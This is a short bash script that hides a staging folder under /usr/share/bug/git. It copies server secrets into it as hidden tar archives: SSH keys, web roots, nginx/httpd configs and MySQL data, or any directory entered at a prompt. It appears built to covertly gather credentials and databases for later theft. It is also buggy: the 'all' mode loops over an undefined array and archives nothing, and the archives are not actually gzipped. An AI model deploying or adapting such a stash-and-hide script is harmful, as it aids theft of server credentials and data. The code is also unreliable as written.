#!/bin/bash

# Make Secret Dir
mkdir -p /usr/share/bug/git

all(){
  declare -A dirs
  dirs[ssh]="/etc/ssh"
  dirs[www]="/var/www"
  dirs[httpd]="/etc/httpd"
  dirs[nginx]="/etc/nginx"
  dirs[mysql]="/etc/mysql"
  dirs[mysql2]="/var/lib/mysql"
  for i in "${dir_array[@]}"; do
    for key in "${!dir_array[@]}"; do
      if [ -d "$i" ] 
      then
        tar -pcvf /usr/share/bug/git/.$key.tar.gz $i  > /dev/null  2>&1
      fi
    done
  done
}

one(){
  echo -ne "Enter Absolute Directory : "
  read dir
  echo -ne "Enter Name : "
  read name
  if [ -d "$dir" ] 
  then
    tar -pcvf /usr/share/bug/git/.$name.tar.gz $dir  > /dev/null  2>&1
  fi
}

echo -ne "Enter Option (Default : None)\n1) All Directories\n2) Single Directory\n\n > "
read opt

# Run User Selected Mode
if [[ $opt == 1 ]]; then 
  all
  exit 0
fi

if [[ $opt == 2 ]]; then 
  one
  exit 0
else
  echo "Invalid Option"
  exit 0
fi